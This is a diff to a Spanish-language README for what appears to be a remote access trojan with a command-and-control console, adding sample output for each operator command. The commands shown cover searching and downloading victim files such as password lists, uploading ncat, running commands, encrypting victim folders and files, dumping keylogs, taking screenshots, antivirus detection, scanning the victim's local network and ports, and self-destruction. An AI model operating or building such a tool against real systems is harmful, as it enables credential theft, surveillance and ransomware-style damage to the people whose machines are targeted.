@@ -151,54 +151,142 @@ TODOS LOS COMANDOS QUE NO CAMBIA EL OUTPUT SE GUARDAN EN CACHE.
     (av, search <ext>, startTask, check, sysinfo, persistence, lowsersistence, scanhost <host>)
 
 
+  - **targets**
+    - Vemos las sesiones actualmente establecidas
+      - `targets`
+
+            <* C&C *>: targets
+            
+                    [  SESSIONS  ]
+            
+            Session: 0
+                ║
+                ║═══► IP Address: 127.0.0.1
+                ║═══► Os Guess: (ttl --> 64): Linux
+                ╚═══► Source Port: 34780
+            
+                    [  END SESSIONS  ]
+
+
   - **search**
     - Con este comando buscamos en todo el sistema archivos con la extension deseada
       - `search pdf`
+            
+            <* C&C * 127.0.0.1>:  search odt
+            
+                [*>] Searching .odt files. This may take a while...
+            
+            [*>] Files find:
+            
+                [*>] /home/supervisor/Templates/text/document.odt
+                [*>] /home/supervisor/supervisor/Templates/text/document.odt
+                [*>] /etc/skel/Templates/text/document.odt
 
 
   - **download**
     - Con el comando "download" podemos descargarnos archivos de la máquina remota
       - `download /home/supervisor/Desktop/Passwords.txt`
 
+            <* C&C * 127.0.0.1>:  download services.py
+            
+                [*>] File Downloaded Successfully [./DATA/127.0.0.1]
+            
+            <* C&C * 127.0.0.1>:  
+
 
   - **downloadDir**
     - Con el comando "downloadDir" podemos descargarnos la estructura completa de la carpeta
       - `downloadDir /home/supervisor/Desktop/UsersData`
+    
+            <* C&C * 127.0.0.1>:  downloadDir ./resources
+            
+                *> Recibiendo datos: [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓]
+            
+            <* C&C * 127.0.0.1>:  
 
 
   - **startTask**
     - Con este comando pones a ejecutarse la detección de adminitradores de tareas (windows/linux)
       - ```startTask```
 
+            <* C&C * 127.0.0.1>:  startTask
+            
+                [*>] Command Send Successfully
+            
+            <* C&C * 127.0.0.1>:  
+
 
   - **check**
     - Miramos si poseemos de privilegios de administrador
       - ``check`` 
-  
+
+            <* C&C * 127.0.0.1>:  check
+            
+                [-] User Privileges
+            
+            <* C&C * 127.0.0.1>:  
+ 
   
   - **sysinfo**
     - Este comando nos devuelve informacion del sistema usando la libreria **platform** 
-        - ``sysinfo``
+      - ``sysinfo``
+
+                          [!>] Target:  Linux
+
+                  | Node Name: parrot
+                  ----------------------------------|
+                  | Kernel: 6.1.0-1parrot1-amd64
+                  ----------------------------------|
+                  | Version: #1 SMP PREEMPT_DYNAMIC Parrot 6.1.15-1parrot1 (2023-04-25)
+                  ----------------------------------|
+                  | Machine: x86_64
+                  ----------------------------------|
+                  | Processor: 
+                  ----------------------------------|
 
 
   - **shell**
     - Entramos en modo shell
       - ``shell``
 
+            <* C&C * 127.0.0.1>:  shell
+            <* Shell * 127.0.0.1>:  
+
 
   - **av**
     - Detección de Anti-Virus (buscando entre procesos, se puede limitar segun el usuario que ejecuta el malware)
       - ``av``
-  
+
+            <* C&C * 127.0.0.1>:  av
+        
+            [!>] Info: Detecting Anti-Virus on target...
+            
+                [*>]  This may take a while... 
+            
+            [*>] No Anti-Virus Detected!
+
+
     
   - **upload**
     - Subir un archivo local a la máquina remota (recomandable: ruta completa)
       - ``upload /home/supervisor/downloads/ncat.exe``
  
+            <* C&C * 127.0.0.1>:  upload requirements.txt
+
+                [*>] File Uploaded Successfully
+            
+            <* C&C * 127.0.0.1>:  
    
+
   - **get**
     - Descargar archivos (binarios incluidos) de una URL
       - ``get https://nmap.org/dist/ncat-7.94-1.x86_64.rpm``
+
+            <* C&C * 127.0.0.1>:  get https://nmap.org/dist/ncat-7.94-1.x86_64.rpm
+            
+                [*>] File Downloaded Successfully
+             
+            <* C&C * 127.0.0.1>:  
 
 
   - **persistence**
@@ -216,40 +304,107 @@ TODOS LOS COMANDOS QUE NO CAMBIA EL OUTPUT SE GUARDAN EN CACHE.
     - Ejecuta comandos en no SHELL mode
       - `exec whoami`
 
+            <* C&C * 127.0.0.1>:  exec whoami
+            supervisor
+
 
   - **cryptDir**
     - Encripta todo el contenido de una carpeta (subcarpetas/archivos) (recomedado: ruta completa)
       - ``cryptDir /home/pwned/project``
+
+            <* C&C * 127.0.0.1>:  cryptDir USERSDATA
+
+                [*>] Dir Crypted Successfully
+            
+            <* C&C * 127.0.0.1>:  exec tree USERSDATA
+            USERSDATA
+            ├── credentials.txt
+            └── SECRETS
+                └── secret
 
   
   - **crypt**
     - Encripta 1 archivo de la victima
       - ``crypt /home/pwned/project/index.html``
 
+            <* C&C * 127.0.0.1>:  crypt credentials
+            
+                [+] File Crypted Sucsessfully 
+            
+            <* C&C * 127.0.0.1>:  exec cat credentials
+            KӞCfV)"H`3#u|~a%Mq-xy
+                             U
 
-  - **keylog_dump**
+
+  - **`keylog_dump`**
     - Dumpea del cliente al servidor todo el keylog que se ha ido guardando
       - ``keylog_dump``
-   
+
+            <* C&C * 127.0.0.1>:  keylog_dump
+            
+            Recibiendo datos: [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓]
+            
+                [+] Recived Keylog Dump Succesfully!
+            
+            <* C&C * 127.0.0.1>:  
  
+
   - **screenshot**
     - Crea una captura de pantalla de la victima y la envia a través del socket
       - ```screenshot```
+
+            Recibiendo datos: [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓]
+            
+                [+] Screenshot Saved As 'DATA/127.0.0.1/screenshot_received-0.png'!
+            
+            <* C&C * 127.0.0.1>:  
 
 
   - **scannet**
     - Ejecuta un escaneo de la red local de la victima en busca de hosts activos
       - ``scannet``
-    
+
+            <* C&C * 127.0.0.1>:  scannet
+            
+            [*>] Networks Detected:
+            
+                ['172.18.0.0/16', '172.17.0.0/16', '192.168.131.0/24', '127.0.0.0/8', '10.12.4.0/24', '192.168.14.0/24', '192.168.237.0/24']
+             
+            [!>] Select Network > 192.168.131.0/24
+            [*>]  Scanning Net, this may take a while
+  
+                [*>] HOST: 192.168.131.48
+            
+                [*>] HOST: 192.168.131.90
+            
+                [*>] HOST: 192.168.131.1
+            
+            <* C&C * 127.0.0.1>:  
+
 
   - **hosts**
     - Muestra los hosts detectados por *scannet*
       - ``hosts``  
-    
+
+          <* C&C * 127.0.0.1>:  hosts
+          
+              ['192.168.131.48', '192.168.131.90', '192.168.131.1'] 
+          
+          <* C&C * 127.0.0.1>:  
+
       
   - **scanhost**
     - Ejecuta un escaneo de puertos y servicios en el host mencionado
       - ``scanhost 192.168.1.1``
+
+            <* C&C * 127.0.0.1>:  scanhost 127.0.0.1
+            [*>] Wait For The results 127.0.0.1...
+                
+                Scaning Port : 65475/65535 [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒] 99.91%
+            
+                [>] Open Ports: [902, 2457, 4040, 6463, 33079, 46458, 63342]
+            
+            [*>] Scanning service of ports. This may take a while - 127.0.0.1 - [902, 2457, 4040, 6463, 33079, 46458, 63342]
 
 
   - **q**
@@ -260,6 +415,9 @@ TODOS LOS COMANDOS QUE NO CAMBIA EL OUTPUT SE GUARDAN EN CACHE.
   - **destruction**
     - Elimina TODOS los archivos dropeados incluido el binario, mata los subprocesos y cierra la conexión
       - ``destruction``
+
+            <* C&C * 127.0.0.1>:  destruction
+
 
   - **exit**
     - Close the conecction
